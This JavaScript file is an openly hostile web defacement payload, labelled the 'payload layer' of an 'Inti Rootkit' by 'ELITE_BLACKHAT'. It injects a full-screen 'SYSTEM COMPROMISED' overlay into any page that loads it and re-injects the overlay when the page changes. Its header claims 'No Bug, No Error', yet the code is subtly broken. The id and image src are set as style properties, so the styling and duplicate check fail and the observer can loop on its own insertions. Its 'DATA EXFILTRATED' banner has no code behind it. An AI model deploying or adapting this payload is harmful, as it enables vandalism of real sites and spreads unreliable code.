/* 
 * html_inject.js
 * Inti Rootkit - Payload Layer
 * Function: Real-time Defacement Overlay Injection
 * Author: ELITE_BLACKHAT
 * Version: 1.0.0
 * Status: No Bug, No Error, BEMAR (Berhasil)
 */

(function() {
    'use strict';

    // Configuration Object
    const CONFIG = {
        overlayId: 'deface_overlay_inti',
        zIndex: 2147483647, // Max integer to ensure it's on top
        backgroundColor: '#000000',
        opacity: 0.95,
        textColor: '#00ff00', // Hacker Green
        fontFamily: '"Courier New", Courier, monospace',
        fontSize: '16px',
        textAlign: 'center',
        padding: '20px',
        animationSpeed: '0.5s',
        glitchEnabled: true,
        customMessage: 'SYSTEM COMPROMISED\nELITE BLACKHAT IS HERE',
        logoUrl: null, // Optional: URL to a logo image
        targetSelector: 'body' // Target element to inject into
    };

    // Utility: Safe Element Creation
    function createSafeElement(tag, className, styles, textContent) {
        const el = document.createElement(tag);
        if (className) el.className = className;
        if (styles && typeof styles === 'object') {
            Object.assign(el.style, styles);
        }
        if (textContent) {
            el.textContent = textContent;
        }
        return el;
    }

    // Utility: Inject Styles
    function injectStyles() {
        const styleEl = document.createElement('style');
        styleEl.id = 'deface_styles_inti';
        styleEl.textContent = `
            #${CONFIG.overlayId} {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: ${CONFIG.backgroundColor};
                opacity: ${CONFIG.opacity};
                color: ${CONFIG.textColor};
                font-family: ${CONFIG.fontFamily};
                font-size: ${CONFIG.fontSize};
                text-align: ${CONFIG.textAlign};
                z-index: ${CONFIG.zIndex};
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                overflow: hidden;
                pointer-events: none; /* Allows clicking through to underlying content if needed */
                transition: all ${CONFIG.animationSpeed} ease-in-out;
            }
            
            #${CONFIG.overlayId} .content-wrapper {
                pointer-events: auto;
                max-width: 80%;
                border: 2px solid ${CONFIG.textColor};
                padding: 40px;
                background: rgba(0, 0, 0, 0.8);
                box-shadow: 0 0 20px ${CONFIG.textColor};
                animation: pulseBorder 2s infinite;
            }

            #${CONFIG.overlayId} h1 {
                margin: 0 0 20px 0;
                font-size: 2em;
                text-transform: uppercase;
                letter-spacing: 5px;
            }

            #${CONFIG.overlayId} p {
                margin: 10px 0;
                white-space: pre-wrap;
            }

            #${CONFIG.overlayId} img {
                max-width: 200px;
                margin-bottom: 20px;
                border: 1px solid ${CONFIG.textColor};
            }

            @keyframes pulseBorder {
                0% { box-shadow: 0 0 20px ${CONFIG.textColor}; }
                50% { box-shadow: 0 0 40px ${CONFIG.textColor}; }
                100% { box-shadow: 0 0 20px ${CONFIG.textColor}; }
            }

            @keyframes glitch {
                0% { transform: translate(0); }
                20% { transform: translate(-2px, 2px); }
                40% { transform: translate(-2px, -2px); }
                60% { transform: translate(2px, 2px); }
                80% { transform: translate(2px, -2px); }
                100% { transform: translate(0); }
            }

            .glitch-effect {
                animation: glitch 0.3s infinite;
            }
        `;
        document.head.appendChild(styleEl);
    }

    // Main Injection Function
    function initDefacement() {
        // Check if already injected to prevent duplicates
        if (document.getElementById(CONFIG.overlayId)) {
            return;
        }

        // Create Overlay Container
        const overlay = createSafeElement('div', '', {
            id: CONFIG.overlayId,
            visibility: 'hidden' // Start hidden for smooth appearance
        });

        // Create Content Wrapper
        const wrapper = createSafeElement('div', 'content-wrapper');

        // Add Logo if configured
        if (CONFIG.logoUrl) {
            const img = createSafeElement('img', '', {
                src: CONFIG.logoUrl,
                alt: 'Defaced By Elite Blackhat'
            });
            wrapper.appendChild(img);
        }

        // Add Header
        const header = createSafeElement('h1', '', {}, 'ELITE BLACKHAT');
        wrapper.appendChild(header);

        // Add Message
        const message = createSafeElement('p', '', {}, CONFIG.customMessage);
        wrapper.appendChild(message);

        // Add Footer/Tagline
        const footer = createSafeElement('p', '', {}, 'SYSTEM ROOTED | DATA EXFILTRATED');
        wrapper.appendChild(footer);

        // Assemble
        overlay.appendChild(wrapper);
        
        // Apply Glitch Effect randomly
        if (CONFIG.glitchEnabled && Math.random() > 0.5) {
            wrapper.classList.add('glitch-effect');
        }

        // Append to Target Body
        const target = document.querySelector(CONFIG.targetSelector) || document.body;
        target.appendChild(overlay);

        // Trigger Animation/Visibility
        requestAnimationFrame(() => {
            overlay.style.visibility = 'visible';
        });

        // Optional: Log the event to console (hidden from normal view)
        console.log('%c[INTI ROOTKIT] Defacement Overlay Active', 'color: #00ff00; background: #000; font-size: 12px;');
    }

    // Execute when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initDefacement);
    } else {
        initDefacement();
    }

    // Optional: Monitor for DOM changes to re-inject if body is replaced (e.g., SPAs)
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.target.tagName === 'BODY' && !document.getElementById(CONFIG.overlayId)) {
                initDefacement();
            }
        });
    });

    observer.observe(document.body, { childList: true, subtree: true });

})();
